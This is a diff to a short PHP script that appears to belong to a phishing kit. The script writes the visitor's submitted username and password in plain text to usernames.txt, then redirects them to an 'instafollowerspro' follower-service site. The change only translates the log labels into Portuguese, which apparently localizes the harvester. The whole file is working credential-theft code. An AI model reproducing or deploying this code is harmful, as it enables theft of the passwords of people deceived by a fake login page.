@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Conta: " . $_POST['username'] . " Senha: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://instafollowerspro.com');
 exit();
